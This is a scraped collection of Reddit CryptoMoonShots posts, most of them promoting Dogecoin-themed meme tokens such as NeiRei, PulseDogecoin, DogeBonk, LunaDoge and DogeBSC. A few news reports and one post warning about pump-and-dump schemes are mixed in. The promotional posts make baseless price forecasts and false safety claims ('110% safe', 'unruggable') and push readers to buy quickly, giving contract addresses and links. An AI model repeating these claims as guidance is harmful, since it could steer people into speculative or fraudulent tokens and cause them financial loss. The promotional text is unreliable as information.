Dogecoin's ATH is 106B market cap. Neiro's ATH is 970m market cap. Now let's come to the headliner, headliners always go on stage last and NeiRei is quietly preparing to take the stage. It is still in the 3-4m market cap range. Its still very early.

With the bull run ahead of us, it wouldn't be surprising if Dogecoin reaches ATH again, and Neiro reaches the 10-20B market cap range. That's what I believe.

What about NeiRei?

I am a Neiro holder. I invested in Neiro early on and now I have a big bag. An untouched bag.

While constantly chasing early opportunities on the road to freedom, sometimes some come to you by chance, sometimes you have to find them yourself, if you are reading this post, I guess you are in luck.

After Neiro took action, I immediately started looking for alternatives, Neiro was good but I needed to reach cumulative growth.. I had to take advantage of this hype.

And yes. I came across NeiRei. The developer had left the coin. And I saw that it was CTOed. The first thing that caught my attention was that it was CTOed. Because Neiro was CTOed and its alternatives should be CTOs too.

I started researching what alternative Chinese coins were doing. Pepe is not being talked about anywhere, I saw PeiPei, the Chinese version of Pepe, reach 180m ATH. I guess I was in the right place. Neiro will be talked about everywhere during the bull run and it is silently standing there: NeiRei. The Chinese Neiro.

NeiRei was CTOed by a few people who believed in it. Neiro is following its hype. Neiro is being talked about everywhere and all eyes should be on NeiRei.

Floor formed strongly in the 3-4m market cap range. The accumulation period continues. As the Neiro hype gets crazier, NeiRei will be next.

Considering that Neiro will reach 5-10b market cap, I see a very high probability of NeiRei reaching the 100-500m market cap range with the crazy bull run.

I focus on the things that have the potential to lead me to financial freedom and I have to tell you clearly that the 2 things that have the highest probability of doing so during this bull run are Neiro and NeiRei.

We may have missed Pepe and PeiPei, but Neiro and NeiRei were sent to us as a second chance. With even greater potential than Pepe and PeiPei.

Now I'm just telling you this and signing it:

Neiro and NeiRei will surpass all the coins before them and head straight to the top.

While you still have time. While you're still early. Don't miss out on the greatest potential.

DOGE,CryptoMoonShots,"Doge Eat Doge ($OMNOM) | The OG community-owned meme coin on Dogechain | SHIB was created to kill Dogecoin, so let's fight back and eat SHIB for breakfast | Already on CMC & CG | Less than two weeks old | ATH after ATH | Join us on the Dogechain revolution","**What is Doge Eat Doge ($OMNOM)?**

Doge Eat Doge (OMNOM) is a community-owned memecoin on DogeChain.

This token is also referred as the ‘Shiba killer’. Shiba Inu (SHIB) is an ERC20 meme token that was created to kill Dogecoin. Doge Eat Doge (OMNOM) is fighting back - get the first meme token on Dogechain to eat SHIB.

>Let’s eat SHIB for breakfast

$OMNOM Contract Address: 0xe3fcA919883950c5cD468156392a6477Ff5d18de

OMNOM was launched on August 10,2022. During the initial launch, 69% of the supply was burned to Vitalik Buterin's wallet, and the remaining 31% of the supply has been added to a pool on Dogeswap.

**How To Buy Doge Eat Doge ($OMNOM)?**

Follow the tutorial bellow:

[**https://web3walrus.com/how-to-set-up-dogechain/**](https://web3walrus.com/how-to-set-up-dogechain/)

**What is Dogechain?**

Dogechain is an EVM-compatible blockchain built using [Polygon SDK](https://polygon.technology/) to create an efficient connection between Dogecoin (DOGE) and Web3. Dogechain’s infrastructure allows DOGE holders to port their DOGE into a blockchain with more possibilities and embrace more opportunities using their DOGE.

Dogechain presents to developers a platform to build DeFi, GameFi, NFTplatforms, and other decentralized applications with DOGE as part of its core economic system. Being [EVM](https://www.coingecko.com/en/glossary/ethereum-virtual-machine-evm)(Ethereum Virtual Machine) compatible, developers on Ethereum and other EVM blockchains can easily build new applications or bridge their existing applications to Dogechain without changing their original code or learning new programming languages

Dogechain runs the Proof of Stake (PoS)algorithm and offers a scalable, fast, and cheap blockchain to DOGE holders who wish to explore more use cases for their DOGE and the rest of the cryptocurrency community as well. The Dogechain community hopes to build gilt-edge NFT, DeFi, and Web3 platforms and also maintain the core characteristics of the original DOGE community.

**How Does Dogechain Work?**

The only peculiar feature of the Dogechain is interactivity features that enable a connection with the DOGE blockchain. Apart from this, Dogechain is similar to Polygon chain and other EVM-compatible PoS chains.

Moving your DOGE to Dogechain involves a special bridging process that allows you to wrap your DOGEs. The wrapping process enables you to create a new token pegged to the value of DOGE on Dogechain. For instance, when you wrap 100 DOGE using Dogechain’s bridging facility, you will receive 100 wrapped doge (wDOGE) on your Dogechain wallet. The wrapped DOGE is pegged to the value of DOGE and can be easily inter-bridged across both platforms.

Relative to DOGE, wDOGE on Dogechain can be used for blockchain governance, payment of transaction fees, and as utility tokens on Web3 platforms

DOGE,CryptoMoonShots,Do you think that Dogecoin will become the currency of Twitter?,"Dogecoin has been making waves lately, especially after Elon Musk tweeted about it being the “future of currency” during a Saturday Night Live show.  


I read that they switched the blue bird logo to the Doge logo, I needed to check it out asap and yup, it's true, there's no blue bird anymore. My first thought was, damn, this is going to affect the price, it's gonna skyrocket!  


And ofc this prompted a 30% increase in Dogecoin’s value within minutes, making it the top-performing cryptocurrency of the day.  


Immediately, I was checking my portfolio manager on Flynt Finance lol.   


However, the main question on everyone’s mind is whether Dogecoin will become the currency of Twitter. Musk is a known follower of Dogecoin and has been promoting it on his social media channels.  


What do you think, will it become or not?  


I thought there is maybe a possibility for that since the introduction of the ‘paid’ blue tick verification for users, some are wondering if the social media platform will integrate Dogecoin as payment for the service.  


Musk has not yet confirmed that Dogecoin will be accepted as payment on Twitter. Tbh, I'm so impatient and hyped about all of this.",1,2023-04-04 15:41:40,3

DOGE,CryptoMoonShots,Introducing Bitcorn - The First and Only Solana DEX Token with Unique Potential,"Hello, fellow crypto enthusiasts. I am excited to share a fresh and innovative project that has recently entered the market: Bitcorn. This project is designed to stand out not only with its unique concept but also with its strong technical foundation and early-stage investment opportunity.

Why Bitcorn?

Bitcorn is a creative fusion of Bitcoin’s credibility and the charm of simplicity, represented by corn. While the concept is playful, the project itself is backed by a serious mission: to be the first and only token exclusively available on Solana DEX. This ensures high-speed transactions and low fees, leveraging Solana’s superior blockchain technology.

The project aims to create a sustainable and rewarding ecosystem for its holders, focusing on long-term growth rather than short-term hype. With a limited supply and a solid roadmap, Bitcorn is positioned to be a standout project in the competitive crypto market.

Key Features:

 • Built on Solana: Faster and cheaper transactions compared to many other blockchains.
 • First on Solana DEX: Bitcorn holds a unique place as the only token of its kind on this platform.
 • Community-Centric: The team is highly active and committed to building a loyal and informed community of investors.

Tokenomics and Launch Details:

Bitcorn has a total supply of [X] tokens, with fair distribution to ensure no whales dominate the market. The initial liquidity is locked, providing added security for early investors. With the project still in its early stages, this is an excellent opportunity to join before the broader market takes notice.

DOGE,CryptoMoonShots,PulseDogecoin - The one and only great memecoin on Pulsechain Network!,"The PULSECHAIN (PLS) network is expected to launch in less than two weeks, and what was missing until recently is the biggest, best and scarce memecoin on the network! 

Let me introduce you to PulseDogecoin (PLSD) !

PLSD has a max supply of 12 million, of which is determined by HEX stakers. HEX stakers are eligible to claim their FREE airdrop, based off their staking league within HEX. 

The amazing thing is, that the biggest hex holders, aren't eligible to anything! This means that they won't be selfishly dumping, and the lower and middle class stakers are entitled to claim. 
Hex stakers are known to be the strongest of holders, on average a stake length is 6.5 years!!

The token launched only a few days ago, on April 20th with 50K USD liquidity, 50k tokens, with a starting price of $1! 

The social media pages has seen very organic growth with no paid marketing at all

The holder count is over 8000 and while most free claimers have been dumping; multiple HEX multi-million dollar wallets have been accumalating! 

ATL: $0.75
ATH: $4.20

With the limited supply (max 12m, might not even see 6m!) this could go into the hundreds per token!! 

Website: pulsedogecoin.com
TG: t.me/plsdcoin
Free claim: PulseDogecoin.app
Twitter: @PLSDogecoin

ZERO taxes on buy and sells! Unlike your regular Ponzi memecoin!!

Audited and vetted contract proven to be 110% safe!

Historically all meme coins on new L1's have gone on to do hundreds of X's! (E.g. cronodoge done 420x from launch! and PLSD has only done 3x!)

Secure your bags now and you will get a free copy on the pulse chain network when live!",5,2022-04-30 11:17:54,15
DOGE,CryptoMoonShots,CorgiCoin is a 1 day old dogecoin for Binance Smart Chain with fully locked supply,"CORGI is the first dogecoin for everyone. All 10,000,000,000 tokens have been permanently locked on PancakeSwap and the keys burned. CORGI is truly community owned.

CORGI just launched on social media a few hours ago, so you can still purchase a big chunk of coins for cheap. The market cap has already ballooned to $20k to $150k. The devs are in it for the long haul and committed to achieving USD Parity ($1/coin) for a $10b market cap.

Built from head to paw for democratic access on the Binance Smart Chain, CORGI is 100x cheaper to send than comparison ERC-20 pups. Ethereum gas fees have soared to over $100 for a simple token exchange, locking everyday pups out of ownership. CORGI is designed from the ground up as a BEP-20 token on BCS, so it can be transferred and exchanged for just cents! 
https://corgicoin.net 
Telegram: t.me/CorgiCoinBSC

What Makes CorgiCoin Unique?

DOGE,CryptoMoonShots,$BELLS: The True Origin of Memecoins Returns,"$BELLS – The First Memecoin Returns to the Spotlight

Contract: 0xBa2A3Dad197D6fee75471215eFD5C30c8C854e11

The history of memecoins is being rewritten. While many believe Dogecoin, launched in December 2013, was the first memecoin, the true pioneer of this movement is Bellscoin ($BELLS). Created by Billy Markus (@BillyM2k), the same developer behind Dogecoin, Bellscoin came into existence roughly 8 days prior to Dogecoin, making it the first-ever memecoin. In fact, Dogecoin itself is a fork of Bellscoin, marking $BELLS as the foundation from which the meme token revolution emerged. This long-forgotten origin has now been brought to light, as even Billy Markus confirmed in a recent post: BillyM2k confirmation.

Reviving Bellscoin’s Legacy on Ethereum
For nearly a decade, $BELLS remained overshadowed by Dogecoin’s rise to global fame. However, the memecoin that started it all is now poised for a resurgence. The revival of $BELLS on the Ethereum blockchain signifies a new beginning for the project, promising to reclaim its place as the true originator of the memecoin movement. As Dogecoin led the charge in popularizing dog-themed tokens, $BELLS is set to reignite the excitement for memecoins, this time with renewed purpose and a historic legacy to back it.

The Potential for $BELLS
With the spotlight returning to its roots, $BELLS holds immense potential to become the next big breakout in the memecoin space. Its historical significance, paired with the revival on Ethereum, positions $BELLS to capture the attention of both seasoned crypto investors and a new generation of enthusiasts. As it rides the wave of nostalgia and meme culture, $BELLS is poised to lead the next chapter in the memecoin revolution.

DOGE,CryptoMoonShots,PulseDogecoin - Pulsechain's first and greatest meme coin!,"The PULSECHAIN (PLS) network is expected to launch in less than two weeks, and what was missing until recently is the biggest, best and scarce memecoin on the network! 

Let me introduce you to PulseDogecoin (PLSD) !

PLSD has a max supply of 12 million, of which is determined by HEX stakers. HEX stakers are eligible to claim their FREE airdrop, based off their staking league within HEX. 

The amazing thing is, that the biggest hex holders, aren't eligible to anything! This means that they won't be selfishly dumping, and the lower and middle class stakers are entitled to claim. 
Hex stakers are known to be the strongest of holders, on average a stake length is 6.5 years!!

The token launched only a few days ago, on April 20th with 50K USD liquidity, 50k tokens, with a starting price of $1! 

The social media pages has seen very organic growth with no paid marketing at all

The holder count is over 8000 and while most free claimers have been dumping; multiple HEX multi-million dollar wallets have been accumalating! 

ATL: $0.75
ATH: $4.20

With the limited supply (max 12m, might not even see 6m!) this could go into the hundreds per token!! 

Website: pulsedogecoin.com

TG: t.me/plsdcoin

Free claim: PulseDogecoin.app

Twitter: @PLSDogecoin

ZERO taxes on buy and sells! Unlike your regular Ponzi memecoin!!

Audited and vetted contract proven to be 110% safe!

Historically all meme coins on new L1's have gone on to do hundreds of X's! (E.g. cronodoge done 420x from launch! and PLSD has only done 3x!)

Secure your bags now and you will get a free copy on the pulse chain network when live!

DOGE,CryptoMoonShots,DogeBonk ($DOBO) 🏏 - Meme token with a strong chance of going VIRAL. Contract Renounced / LP Burned / No Whales >2%,"DogeBonk is a completely unruggable, spontaneously formed community token with the most potential to go viral of any meme coin since Shiba.

Since DogeCoin exploded earlier this year there have been thousands of dog coins most of them scams, false promises and poor ripoffs with devs sole purpose being to make as much money from their holders as possible. Every day another team launches their coin trying to piggyback off the success of others, offering false promises of NFT marketplaces, metaverse worlds and whatever else is the newest trending hashtag on Twitter. These coins have forgotten that what makes you a meme coin is how good your memes are.

​

DogeBonk is different. The DogeBonk community spontaneously formed just two weeks ago on a dead dog token someone found with locked liquidity, renounced contract and SafeMoon tokenomics. We have grown from <300 holders two weeks ago to over 4000 today. We have no false road maps promising the world, we just spread our hilarious meme and convince others to join us as we bonk everything.

The memes and energy coming from this community is crazy. Just search DogeBonk on the search bar on Twitter and you’ll see what I mean. Once you see the quality of these memes you will see how DogeBonk has huge potential to go viral. DogeBonk is the most memeable project in the crypto space since Doge.

Despite our lack of false promises, the team and community is still delivering:

bonkSWAP launched, making it super easy for even non-crypto natives to purchase $dobo from fiat - [www.bonkswap.com](https://www.bonkswap.com/)

​

# Is DogeBonk safe?

* Liquidity was locked forever by burning all LP tokens 🔥
* Ownership of the contract was renounced.
* See proof on our website.
* Contract is a 1:1 copy of SafeMoon which was audited by Certik.
* Top holder owns only 1.9% of the supply.
* As microcap gems go, it’s an unruggable beauty.

# Tokenomics

* 10% tax on all transactions:
* 5% are distributed to fellow DOBO holders,
* 5% are added to liquidity to create an ever rising price floor.
* \-> token with deflationary properties and automatic yield generation. (Burn wallet is receiving \~1% of all transactions FORTY% burned so far)
* There was no presale and to prevent bots from sniping the token, you can only buy/sell 0.5% of the total supply at the time 🎯

DOGE,CryptoMoonShots,"Warning: Farming, Yields and ""Deflationary"" should be big red flags for you.","There is a new type of ponzi scheme growing, and it's being promoted in this sub as a legitimate investment opportunity. And it has been giving me big 2017 bitconnnecccct vibes, so I wanted to warn all the newbies.

These types of scamcoins are all over the sub right now.

""Farming"" and ""Deflationary Tokens"" can be indicators that the cryptocurrency you are buying is a scamcoin built to make developers (or at best, early adopters) lots of coin -- and to be promptly dumped on unsuspecting investors.

Some examples:
Cobalt.finance
Goodboi.finance
Wynaut.finance ( Meowth and Wynaut) <- Being shilled right now, in this sub.
Shrimp.capital <- Being shilled right now, in this sub.
Hoge.

There are heaps of examples of projects like these, and they all rely on the same model.

First, The developer creates a smart contract which either:

A) Burns 2-10% per transaction.

B) Steals 2-10% per transaction and gives it to ""stakers"".

C) Allows you to lock (stake) your newly purchased token to farm more of the token, or another shitty token.

Fun fact: there are generators for these smart contracts avaliable on the internet for $100. 

Secondly, The developer puts the all the tokens and 1BNB in Pancakeswap or Uniswap, and burns the Liquidity Provider tokens. This is done to convince users that they cannot be ""Rugged"" by a developer removing the BNB from Pancakeswap -- rendering the tokens worthless.

Thirdly, the developer announces the release of his token. Not before putting in a big buy order on Pancakeswap, gobbling up a large chunk of the supply and promptly dumping it on everyone who purchases after him -- who ignorantly think that because the LP token was burned, they can't get ""rugged"".

If the coin you're thinking of investing in, fits this criteria, it's probably a pump and dump shitcoin.

https://tokensniffer.com/tokens/scam maintains a list of known rugs and scams, but often once it's on this list -- it's too late.

Nobody in a year is going to remember yet another ""deflationary"" coin that has 0 usecase. Goodboi will not be the next Dogecoin.

Anyone shilling these coins has big bags and is just trying to dump them on you, and is complicit in perpetuating the scam.

That is all. I'll try to get you guys some good gems in coming days btw.",617,2021-03-01 07:36:13,376
DOGE,CryptoMoonShots,Elon Musk is improving Dogecoin transaction efficiency & major exchanges adding DOGE to their crypto offerings,"[Dogecoin](https://www.reddit.com/r/dogecoin/) (DOGE.X) is once again running with the wolves after Tesla’s Elon Musk's [Tweet](https://twitter.com/elonmusk/status/1392974251011895300) on Thursday evening, Tesla and its CEO are “working with Doge” developers to “improve system transaction efficiency.”

Prices across major exchanges including Binance, Bitfinex, FTX, Gemini, and Poloniex are posting around 22% gains over a 24-hour period. The cryptocurrency is currently changing hands for around $0.53. The increase came even as other major cryptocurrencies’ prices sank.

Meanwhile, U.S. cryptocurrency exchange Coinbase announced it would be adding DOGE to its suite of crypto offerings in six to eight weeks, likely due to client demand as has been the case with other major exchanges.

eToro said it’s adding Dogecointo the cryptocurrencies traded on its exchange due to client demand. eToro's 20 million users around the world will now be able to trade the Shiba Inu-represented crypto. It joins the likes of Kraken, Crypto.com, OKEx, and other [exchanges that list the cryptocurrency](https://www.coingecko.com/en/coins/dogecoin#markets).

Gemini Exchange Users Can Now Earn Interest on Dogecoin. The Winklevoss brothers-founded cryptocurrency exchange, has added Dogecoin to the cryptocurrencies supported by its Earn lending program, allowing customers to earn interest on their holdings.

Users can realize as much as 2.25% annual percentage yield (APY) on DOGE, Gemini said in a [blog post](https://www.gemini.com/blog/earn-interest-on-doge-with-gemini-earn-which-now-holds-usd2b-in-assets) on Saturday. Under the program, users can earn between 1.26% and 7.75% APY.

Coinbase will add meme-based cryptocurrency Dogecoin to the U.S. cryptocurrency exchange’s offerings, CEO Brian Armstrong said on the company’s [Q1 earnings](https://www.coindesk.com/coinbase-boosts-year-mtu-forecast-range-while-reporting-q1-results-inline-with-preview) call.",82,2021-05-14 14:13:57,9

DOGE,CryptoMoonShots,🌜 LunaDoge 🌜 [$2.5M market cap] One of the healthiest charts on BSC 📈," 

The LunaDoge token ($LOGE) takes the deflationary tokenomics of Safemoon and fuses it with the novelty of Dogecoin. LunaDoge operates just like SafeMoon, Shiba Inu, Elongate, and Moonrat with regards to a quadrillion dollar token supply and deflationary nature.

LunaDoge is a fork of MoonRat and SafeMoon. Both projects have been audited by CertiK, assuring users that there is no backdoor in the code for the team to scam its investors. $LOGE is currently in it’s infancy and is only available on PancakeSwap🥞.

Why does this token have Moon potential???

✅Hold and Earn

· Every transaction incurs a 10% fee · 5% distributed to hodlers (LOGE will automatically get added to your wallet) · 5% permanently added to liquidty creating a steady rising floor Anti-Whale measures · Transactions greater than 0.5% of supply rejected to prevent Whale manipulation

✅Liquidity Locked

· Team tokens (24% of total supply) locked using third party provider DXSALE · Team tokens RE-LOCKED as of May 5th · 15% for 6 months, 5% for 3 months; 4.7% for 14 days which will be re-locked again · 1% burn every 2 weeks to a dead address which will create an ever decreasing supply of LOGE

✅100% Community Driven

· LunaDoge is fully transparent · Whitepaper · All team and LP tokens have been locked · Every trade automatically contributes to generating liquidity

✅Bi-weekly Token Burn

· Every second week the team will burn 1% of total $LOGE supply from their own tokens · This coincides with team token re-locks

✅Marketing and Branding

· They have a growing community on Telegram, Twitter, and Instagram (links at the bottom) · This is a key element in the success of any product · The graphic design team has developed an appealing logo · Community contests such as a meme competition (running until May.8th) · They've partnered with multiple influencers to build brand awareness

✅What’s in the Pipeline?

· Coinmarketcap listing (pending) · Coingecko Listing (pending) · External audit · Website updates · LunaDoge Mars Program · Cross-chain integration · Token farming · Partnership rollout · Community growth

This team has continued to demonstrate their commitment to the LONGEVITY of this project and have continually increased my investment confidence through their actions! Its holders are put first and that seems to be a rarity given the recent landscape of startup projects.

Do your own DD and let me know what you think! Hopefully we’ll take a ride to the moon together 🚀

DOGE,CryptoMoonShots,"Meme-Crypto Wars: Dogecoin and SHIB Prices Falter, Cake Monster Jumps Over 800% in 7 Days","[https://news.bitcoin.com/meme-crypto-wars-dogecoin-and-shib-prices-falter-cake-monster-jumps-over-800-in-7-days/](https://news.bitcoin.com/meme-crypto-wars-dogecoin-and-shib-prices-falter-cake-monster-jumps-over-800-in-7-days/)

**In 2021, meme-based crypto assets skyrocketed in value following the lead of the original meme crypto-asset dogecoin’s massive gains. This week a great number of digital currencies have rebounded in price but a slew of popular meme tokens are not doing so hot this week. However, one specific meme-crypto called “cake monster” has jumped 112% in value during the last 24 hours.**

## Dogecoin and Shiba Inu Markets Have Seen Better Days

Bitcoin.com has covered a wide variety of meme-based cryptocurrencies that followed the ‘Dogefather’s’ 8,818% one-year gains. [Dogecoin (DOGE)](https://markets.bitcoin.com/crypto/DOGE) has seen a triumphant rise in 2021 thanks to mainstream media coverage and shoutouts from the Tesla CEO Elon Musk.

[DOGE](https://markets.bitcoin.com/crypto/DOGE) has gained 36.5% during the last month, but dogecoin is down 13% over the course of the week. At the time of writing, a single DOGE is swapping for $0.284508 per unit.

Another meme-asset that took the crypto world by storm is [shiba inu (SHIB)](https://www.coingecko.com/en/coins/shiba-inu) as it has outpaced dogecoin’s gains gathering a whopping 8,750,740% in less than 12 months.

But just like [DOGE](https://markets.bitcoin.com/crypto/DOGE), SHIB is down 14.8% during the last seven days. SHIB has only gained 16.6% during the last 30 days and at the time of writing a single SHIB exchanges hands for $0.00000721 per token.

## Cake Monster Performance Outshines All the Meme Token Markets

Those two crypto assets are the largest meme-based cryptos in terms of market capitalization as DOGE has a $37 billion market valuation and SHIB has a ​​$3.5 billion capitalization.

This is followed by monacoin ($129M), hoge finance ($74M), yooshi ($60M), cumrocket ($58M), cake monster ($32M), and dogelon mars ($31M). The crypto-token [cake monster (MONSTA)](https://cake.monster/) has been the largest gainer out of all the meme assets in terms of gains.

MONSTA has jumped a whopping [844%](https://www.coingecko.com/en/coins/cake-monster) in seven days and 1,550% over the last two weeks. 30 day stats show cake monster (MONSTA) is up 1,295% during the last month. The Cake Monster team says that the defi protocol is the first to leverage [Gravity Vaults](https://docs.cake.monster/).

Cake is deflationary and transaction fees are continuously added to the Gravity Vault. Furthermore, when the Gravity Vault taps 1 million MONSTA, holders can claim their coins from the defi vault. A single MONSTA is swapping for $0.00538036 per unit at press time.

## Catecoin, Floki Inu See Double-Digit Gains — Gpunks, Kawakami Inu Tokens Slide

Despite [DOGE](https://markets.bitcoin.com/crypto/DOGE) and [SHIB](https://www.coingecko.com/en/coins/shiba-inu) not doing so hot during the last seven days, a myriad of meme assets have seen double-digit gains. Catecoin (CATE) is up 46% this week, floki inu (FLOKI) has gained 42%, hoge finance (HOGE) 42%, and yooshi (YOOSHI) gained 26% this past week.

The biggest meme-coin losers include grumpydogepunks (GPUNKS) down 52% this week and kawakami inu (KAWA) is down 47% over the last seven days.",21,2021-08-28 18:57:15,12

DOGE,CryptoMoonShots,Just stealth launched! 🔎NanoDoge🐶 - Earn Dogecoin from holding | 9k Marketcap,"JUST STEALTH LAUNCHED

🔎NanoDoge🐶

Feel like you’re missing out on the Doge hype? Welcome to NanoDoge! 

Holding NanoDoge ensures you won’t miss out on any more DOGE. From just holding, you can claim Dogecoin (DOGE) through interaction with the contract. This means that if the prices of either NanoDoge or Dogecoin go up, you win! 

Why NanoDoge? Nano because the initial liquidity will be Nano and a maximum wallet size is implemented (1% of total supply). This coin has built in dump protection with a maximum sell amount every hour

&#x200B;

💰Tokenomics:

Total Supply: 10,000 NDoge

Max wallet: 100 NDoge

Max sell: 10 Ndoge

One sell every 60 minutes – This means that a max wallet will take 10 hours to completely dump!

&#x200B;

💼Taxman fees:

Buys – 10%

Sells – 20%

Transfers – 30%

&#x200B;

🔥40% Burn

💧40% LP

🐶20% Staking 

&#x200B;

It’s that simple guys. HODL NanoDoge -> get Dogecoin -> NanoDoge/Dogecoin goes up -> 💵$$$💵

DOGE,CryptoMoonShots,🐶50 Shades of FLOKI🐶 | Stealth Launched Yesterday | Only $4k MC | Based + Experienced Team 🚀,"50 Shades of FLOKI has arrived, and he's ready to sexually torture all these scamming AltDoge coins out of existence. He comes equipped with INSANE Degen Inu $DINU rewards, as well as anti-whale tokenomics to protect investors. 50 Shades of FLOKI is hot, kinky, and he won't let any vanilla punks destroy his moonshot.

50 Shades of FLOKI is a community driven token on the BSC network! His goal to both enable kinksters to KINK the hype of the Doge craze, but also to become a supportive icon for the men & women across the world who choose to consentually trade sex for currency, as it is their personal right to do so.

**Kink-onomics:**

**Total Supply:** 1,000,000,000,000 $SoFLOKI

**SLIPPAGE:** 15%

💰 5% of every transaction will get reflected as $DINU to all the Kinksters who have been diamond handing with us!

💠 5% of every transaction gets sent to our Marketing Wallet as BNB! That means we'll never have to sell $SoFLOKI to fund the journey, which will help maintain a healthy chart.

💧5% of all transactions will go back into the Liquidity Pool to help stabilize our floor and protect our moonshot!

DOGE,CryptoMoonShots,Elon Musk & Shibatoshi Tweeted!! $Kabosu the Official Fake CEO of Dogecoin,"Trending On CoinGecko, DexTools and CoinMarketCap!

Oh & Elon and Shibatoshi tweeted!

[https://twitter.com/BillyM2k/status/1455671073995845635](https://twitter.com/BillyM2k/status/1455671073995845635)

The legendary $KABOSU has made a return with the whales. You might be wondering why the token surged after the Elon cosign. The reason being because $KABOSU is a legimitate doge project that can't be rugged and moons like no other. Already audited, high liquidiy and growing market cap of over 16m, even the moon isn't the limit for $KABOSU. A promising BSC project with a promising team of devs. Marketing rollout coming soon and exchange listings also in the works.

Kabosu was born in November 2nd, 2005 in a Japanese pedigree puppy mill that was promptly shut down, leaving Kabosu stranded in one of Japan’s many animal shelters. The owner of Kabosu, Atsuko Sato, rescued her in 2008, saving her from certain death at the hands of humanity. Her name was given by a shelter volunteer – Kabosu is a type of fruit and said rescue worker mentioned that her face was very round, just like the fruit.

The goal of Kabosu is to prevent dogs of all breeds from being abandoned. For this reason we will & have been making weekly donations to community chosen dog charities (as shown on website).

DOGE,CryptoMoonShots,DogeBSC – Next Step for Dogecoin's Evolution!,"Ever wondered what would happen if you could bridge Dogecoin to all the top meme-coins like Safemoon and blockchains like Bitcoin? Sounds exciting, yes? Exactly!

&#x200B;

That is what DogeBSC is about to bring to everyone with our upcoming DogeBridge. This is one of the many projects the team at DogeBSC are about to release for (and not limited to) the Doge community.

&#x200B;

Okay let's cut the long talk and answer some FAQs first.

&#x200B;

**What is DogeBSC about?**

We are in the process of transitioning from a full-blown meme/charity coin to a DeFi ecosystem for the Doge community.

But we are still very big on GIVING BACK because that's what community should be about.

Our tokenomics have been set to include a mandatory 1% of tx for charity (We have partnered with Giving Block for donations). We have donated over $11k to dog charities so far and plan to expand past that as the project grows.

&#x200B;

**Why is DogeBSC special compared to tokens?**

Asides from the charity aspect, I would like to introduce you to Adjustable Tokenomics. There is a Governance mechanism in place where holders get to decide on what tokenomics to use. This is something rare on the Smart chain if it even exists anywhere else.

This grants us the flexibility for whatever plans the community have going forward. For example the community just voted with 41% of the votes to lower our tx tax to 8% from 10% by decreasing liquidity and community fund, and doubling reward and burn from 1% to 2%.

&#x200B;

**What is the DogeBridge?**

We call it the “People’s Bridge.”

It basically allows Dogecoin holders to swap their coins directly  to our native token and vice versa. This will allow DogeWorld to tap into the $20 billion of average daily volume Dogecoin has had in the past month. Given that this is cross-chain, other chains will be added shortly after like Bitcoin as well as other BSC & Ethereum tokens like Safemoon and Shiba.

&#x200B;

SPOILER ALERT: There will be other huge projects to follow the DogeBridge in the near future including:

* DogeChart
* DogeVote
* DogeSwap
* DogeFarm

&#x200B;

**What is the goal of The DogeBridge?**

Our goal is to support the Dogecoin community by merging the coin with other chains to support cross-chain development and liquidity, as well as a cross-chain DeFi experience for Doge which we call DogeWorld.

&#x200B;

**Technicalities of DogeBSC:**

* 39.6 B circulating supply
* 6 weeks old
* over 2k holders
* just over 3.2M$ marketcap
* successful Techrate Audit (with Certik audit planned)
* governance mechanism being implemented (so the community decides the future of the token including the tokenomics)

&#x200B;

**Tokenomics (updated):**

* 8% tax on transactions
* 2% auto-staking
* 2% burn
* 2% liquidity
* 1% charity
* 1% community fund

&#x200B;

**Roadmap:**

* $11k+ donations to dog shelters done ✔️
* General Whitepaper and DogeBridge Whitepaper done  ✔️
* Blockfolio/Delta Listings done ✔️
* CoinGecko/CMC Listings have been applied for and are imminent
* Website Redesign to include planned projects (a la DogeBridge and a few more huge projects)
* DogeBridge Launch (will function both directions!)
* Strategic partnerships

DOGE,CryptoMoonShots,"After GME, Dogecoin and Bitcoin, Chinese Traders Are Betting What Will Pump Next","Rallies in GameStock (NYSE: GME) shares as well as dogecoin (DOGE) and bitcoin (BTC) are piquing the betting interest of traders in China as much as they are in the United States.

On Weibo, the popular social media platform in China, the highly active crypto community is speculating on which cryptocurrency will be next to get a major pump after dogecoin and bitcoin jumped in recent days.

“Were it not that Ripple was struggling with its lawsuit, the next token being pumped by the retailers in the U.S. could have been XRP,” according to one Weibo account holder with nearly 40,000 followers. “Many newcomers to crypto only look at prices and names, and they do not care how many times this particular token has taken away people’s money or whether it is highly centralized.”

DOGE,CryptoMoonShots,Dogecoin on the Binance Smart Chain ($DogeBSC) - Could this DOGE project be ready for DeFi and become a potential winner..?," (repost from [u/Every\_Hunt\_160](https://www.reddit.com/user/Every_Hunt_160/))

So why $DogeBSC? Sharing my thoughts here:

1. **Much lower market Cap**, compared to other meme coins. Total supply of DogeBSC is 40 billion coins, and of the time of writing (price of $0.0000014) the Market Cap of DogeBSC is **52,000.** For comparison, **HOGE** and **SafeMoon** has a market Cap of around 200 million - which is almost **4,000 times** higher than DogeBSC's market cap. I'm not even talking about meeting the OG's Doge market cap here, just staying in the realm of Meme DeFi Coins. So far, there are only about 600 wallets holding the coin - still a super early project so far. Details here: [https://bscscan.com/token/0x1a82c24dd17c2b309b8ae4807920829237d59f26](https://bscscan.com/token/0x1a82c24dd17c2b309b8ae4807920829237d59f26)
2. **Brand Name.** DogeCoin is the first ever meme coin with over $7 billion market cap. DogeCoin is also the only coin with mainstream and institutional interest (albeit as a joke), and more companies (following Dallas Mavericks) will start accepting Doge as a payment method in the coming future. But that is DOGE and not DogeBSC, you might say. But guess what - DogeBSC is the first and only DOGE project on ANY DeFi space - when DeFi blows up (as it already is), interest in Doge in mainstream space will translate to interest in Doge in the DeFi space. When DogeBSC gets into mainstream attention as the first Defi Doge project, and media coverage the market cap has the potential to exceed Hoge/Safemoon.
3. **Listing** on **Binance Smart Chain,** as opposed to Uniswap. I've lost count of how many people are put off by buying HOGE and GRUMPY and instead putting their money into SafeMoon instead because of the insane gas fees of Eth. A $100 entry gas fee is not an accessible fee for the average institutional investor, and if you look at DogeCoin there are plenty of early adopters with just a $10 or $30 stake getting into it. The price of DogeBSC means you can get millions or billions with a small bag, very similar to when the OG Doge first came out. But the small investors won't drive the market, you might ask? I'd argue you're missing the point here - it is the **INTEREST** rather than the amount that is the real commodity here, for every 10 small investors talks about Doge on the BSC there might be 1 big money investor investing in the coin.
4. **Rugpull-proof, solid project** with a **set timeline**. As of today's writing, the coin is barely 1 weeks old and is awaiting listing on coingecko. When DogeBSC was first launched, the original liquidity tokens were burned, no pre-sale was launched and the devs do not hold any coins to promote trust in the project. Similar to HOGE and SAFEMOON, the element of no rugpull and devs putting the project in the community's control is important to create trust in the project. Full details and project timeline found in their official website [https://dogebsc.finance/](https://dogebsc.finance/)

